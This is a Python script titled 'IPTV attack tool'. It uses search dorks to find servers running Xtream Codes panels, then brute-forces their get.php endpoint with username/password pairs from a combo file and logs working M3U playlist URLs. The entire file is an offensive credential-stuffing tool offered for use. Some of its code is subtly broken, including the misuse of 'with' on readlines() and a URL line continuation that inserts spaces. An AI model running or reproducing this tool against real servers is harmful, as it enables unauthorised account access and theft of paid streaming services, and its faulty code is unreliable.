# -*- coding: utf-8 -*-
"""IPTV attack tool"""
from sys import argv
from urllib.parse import urlparse

from duckduckgo import search
from requests import get
from requests.exceptions import HTTPError


def banner():
    """Banner function"""
    return """
IPTV attack tool.

"""

def usage():
    """Usage method"""
    banner()
    print(f"Usage:\n\tpython {argv[0]} dorkFile.txt comboFile.txt\n")

def extract_urls(dorks_list):
    """URL extractor fuction"""
    temp = []
    with open(dorks_list, 'r', encoding="utf-8").readlines() as dork_lines:
        for dork in dork_lines:
            for link in search(dork.strip(), max_results=400):
                if link not in temp:
                    temp.append(link)
    return temp

def check_urls(urls):
    """URL checker function"""
    temp = []
    for url in urls:
        url = urlparse(url.strip())[1]
        if url not in temp:
            temp.append(url)
    print(f"[i] Found {len(temp)} in total.")
    return temp

def alive_or_not(urls):
    """Availability check funcsion"""
    temp = []
    print("[*] Hunting URLs for Admin panel")
    for url in urls:
        try:
            if "Xtream Codes</a>" in get(f"http://{url}/", timeout=10).text:
                print(f"\tPanel found on URL  -->> http://{url}/")
                temp.append(url)
        except HTTPError as http_error:
            print(http_error)
    print(f"[i] {len(temp)} of them are alive!")
    return temp

def brute_accounts(urls,combos_file):
    """Bruteforcing function"""
    with open(combos_file, 'r', encoding="utf-8").readlines() as user_lines:
        for user in user_lines:
            print(f"[i] Trying combo: {user.strip()}")
            for url in urls:
                try:
                    account_to_try = f"http://{url.strip()}\
                        /get.php?username={user.strip()}&password={user.strip()}&type=m3u&output=ts"
                    if "#EXTINF:0" in get(account_to_try, timeout=15, stream=True).text:
                        print(f"[+] Playlist URL found: {account_to_try}")
                        with open("logs.txt", "a", encoding="utf-8") as logs_file:
                            logs_file.write(f"{account_to_try}\n")
                            logs_file.close()
                except HTTPError as http_error:
                    print(http_error)

if __name__ == '__main__':
    try:
        usage()
        dorks = argv[1]
        combo_file = argv[2]
        brute_accounts(alive_or_not(check_urls(extract_urls(dorks))), combo_file)
    except KeyboardInterrupt as e:
        print(e)
